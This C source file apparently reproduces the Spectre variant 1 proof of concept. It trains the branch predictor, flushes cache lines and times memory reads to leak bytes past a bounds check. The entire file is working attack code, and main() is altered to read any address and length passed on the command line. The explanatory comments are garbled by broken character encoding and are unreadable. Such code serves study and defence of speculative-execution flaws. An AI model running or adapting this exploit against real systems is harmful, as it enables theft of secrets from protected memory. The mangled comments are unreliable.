#include <stdio.h>
#include <stdint.h>
#include <string.h>

#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt", on)
#else

#include <x86intrin.h> /* for rdtscp and clflush */

#endif

/* sscanf_s only works in MSVC. sscanf should work with other compilers*/
#ifndef _MSC_VER
#define sscanf_s sscanf
#endif

/********************************************************************
Victim code.(�ܺ��ߡ���spectre�����õĵط�)
********************************************************************/
unsigned int array1_size = 16;                                               // ����array1�Ĵ�С
uint8_t array1[16] = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15}; // ����array1
uint8_t array2[256 * 512]; // ���ŵ�������(cacheһ��ȡһҳ,��СΪ512B,����ÿ�����յ�Ҫ��512B)

const char *secret = "The Magic Words are Squeamish Ossifrage."; // ���Զ�ȡ������

/*
 * ���ŵ�������
 * ע��:��Ϊarray1�����0..15,������ѵ��"��֧Ԥ��"��ʱ��,�ᷢ��array1���������,�ⲿ�������ڽ���ʱҪ���ˡ�
 * */
uint8_t temp = 0; // ʹ�� temp ȫ�ֱ�����ֹ�������Ż� victim_function()
void victim_function(size_t x)
{
    if (x < array1_size)
    {
        /*
         * ���ŵ�������
         * ͨ��array1[x]��ȡ����ֵ,ͨ��array2[array1[x] * 512]������ֵ
         * ӳ��Ϊarray2��Ӧ���յ��Ƿ񱻻���,�����߼��array2��256�����յ�
         * �Ƿ񱻻������ָ���Ϣ(array2����/512)
         */
        temp &= array2[array1[x] * 512];
    }
}

/********************************************************************
Analysis code(�����ߡ�������spectre©������ȡ���ݵĵط�)
********************************************************************/
/*
    cache ���з�ֵ����һ������ֵ��Ĭ��ֵ 80��
    ����ֵ���ڴ�������CPU��������йأ���һ������ֵ��ȡֵ���·�Χ��16 - 176
*/
#define CACHE_HIT_THRESHOLD (80)

/*
 * malicious_x: ����ֵ��array1�ĵ�ַ��,���ŵ�������ͨ�� array1[malicious_x] ȡ������ֵ
 *
 * */
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
{
    static int results[256]; // ����������Ӧ��ascii�뱻����Ĵ���,ѡ����ߵ���������
    int tries, i, j, k, mix_i;
    unsigned int junk = 0;
    size_t training_x, x;
    register uint64_t time1, time2;
    volatile uint8_t *addr;

    for (i = 0; i < 256; i++)
        results[i] = 0; // ��ʼ��

    /*
        ÿ���ַ���γ��Ի�ȡ�����ӳɹ���
    */
    for (tries = 999; tries > 0; tries--)
    {
        /*
            ���array2��ÿ�����յ�Ļ���
        */
        for (i = 0; i < 256; i++)
            _mm_clflush(&array2[i * 512]);

        /*
            ��֧ѵ��
            ����30��,��j�ܱ�6����ʱ,��������ֵ
         */
        training_x = tries % array1_size; // ȷ�� training_x < array1_size, ѵ����֧Ϊ��
        for (j = 29; j >= 0; j--)
        {
            /* ��� array1_size �Ļ���
             * �������ܺ���if�ж�����ʱ,���û���array1_sizeʱ���ٶȲ�,��CPU��ʱ��ִ�з�֧Ԥ��
             */
            _mm_clflush(&array1_size);

            /*
                100 ���ڴ�ȡֵ������ʱ��ȷ�� cache ҳȫ������
            */
            for (volatile int z = 0; z < 100; z++)
            {
            }

            /*
                j % 6 =  0 �� x = 0xFFFF0000
                j % 6 != 0 �� x = 0x00000000
            */
            x = (size_t)(((j % 6) - 1) & ~0xFFFF);
            /*
                j % 6 =  0 �� x = 0xFFFFFFFF
                j % 6 != 0 �� x = 0x00000000
            */
            x = (x | (x >> 16));
            /*
                j % 6 =  0 �� x = malicious_x
                j % 6 != 0 �� x = training_x
            */
            x = training_x ^ (x & (malicious_x ^ training_x));

            /* Call the victim! */
            victim_function(x);
        }
        /*
            �˳��˺���ʱ,������array2�Ѿ�����������ֵ(ʵ�����Ǳ����˶�Ӧ���յ�Ķ�ȡ�ٶ���Ϣ)
        */

        /*
            ��ȡʱ�䡣ִ��˳����΢������ֹ stride prediction��ĳ�ַ�֧Ԥ�ⷽ����
            i ȡֵ 0 - 255 ��Ӧ ASCII ���
        */
        for (i = 0; i < 256; i++)
        {
            /*
                167  0xA7  1010 0111
                13   0x0D  0000 1101
                ȡֵ���Ϊ 0 - 255 ������Ҳ��ظ�
               TODO: ��6����ѧ,������,����
            */
            mix_i = ((i * 167) + 13) & 255;
            /*
                addrΪmix_i��Ӧ���յ�ĵ�ַ
            */
            addr = &array2[mix_i * 512];
            /*
                time1 ���浱ǰʱ�������������
                junk ���� TSC_AUX �Ĵ���ֵ(û�в��ù�)
            */
            time1 = __rdtscp(&junk);
            /*
                ��ȡ���ݣ����Բ���ʱ��
            */
            junk = *addr;
            /*
                ��¼��ʱ(���������ֵ��Ӧ�Ľ��յ�,��Ϊ��֧Ԥ�ⱻ��ȡ������,��ȡ�ٶȽϿ�;�����δ�������,
                ��������Ҫ�����ܵ��ö�Ӧ���յ㻺��,����㲻Ҫ����)
            */
            time2 = __rdtscp(&junk) - time1;
            /*
                �����Ƿ�С��ʱ����ֵ�ж��Ƿ�����,
                ͬʱӦע��,mix_i��Ӧ�õ��ڷ�֧ѵ��ʹ�õ�xֵ,��Ϊ��ѵ������һ�����������
            */
            if (time2 <= CACHE_HIT_THRESHOLD && mix_i != training_x)
                results[mix_i]++; // ����,mix_iΪ����ֵ��ascii��,results��Ӧλ��+1
        }

        /*
            ����,��ȡresults����������ߵ�����ascii��,�ֱ�洢�� j(�������),k���θ����У� ��

        */
        j = k = -1;
        for (i = 0; i < 256; i++)
        {
            if (j < 0 || results[i] >= results[j])
            {
                k = j;
                j = i;
            }
            else if (k < 0 || results[i] >= results[k])
            {
                k = i;
            }
        }
        if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
            break; /* ���j,k��Ӧ��������������������,��Ϊ�ɹ���ȡ����ֵ,���� */
    }

    /*
        ʹ�� junk ��ֹ�Ż����
    */
    results[0] ^= junk;
    value[0] = (uint8_t)j; // ����ֵ
    score[0] = results[j]; // ����ֵ������
    value[1] = (uint8_t)k; // ����ֵ
    score[1] = results[k]; // ����ֵ,������
}

int main(int argc, const char **argv)
{
    //printf("Putting '%s' in memory, address %p\n", secret, (void *)(secret));
    //size_t malicious_x = (size_t)(secret - (char *)array1); /* default for malicious_x */
    size_t malicious_x = 0x0;
    //int score[2], len = strlen(secret);
    int score[2], len=256;
    uint8_t value[2];

    for (size_t i = 0; i < sizeof(array2); i++)
        array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
    if (argc == 3)
    {
        sscanf_s(argv[1], "%p", (void **)(&malicious_x));
        malicious_x -= (size_t)array1; /* ת������ַsize_t */
        sscanf_s(argv[2], "%d", &len);
        printf("Trying malicious_x = %p, len = %d\n", (void *)malicious_x, len);
    }

    printf("Reading %d bytes:\n", len);
    while (--len >= 0)
    {
        printf("Reading at malicious_x = %p... ", (void *)malicious_x);
        readMemoryByte(malicious_x++, value, score);
        printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
        printf("0x%02X='%c' score=%d ", value[0],
               (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
        if (score[1] > 0)
            printf("(second best: 0x%02X='%c' score=%d)", value[1],
                   (value[1] > 31 && value[1] < 127 ? value[1] : '?'),
                   score[1]);
        printf("\n");
    }
    #ifdef _MSC_VER
    printf("Press ENTER to exit\n");
    getchar(); /* ��ͣ��� */
    #endif
    return (0);
}
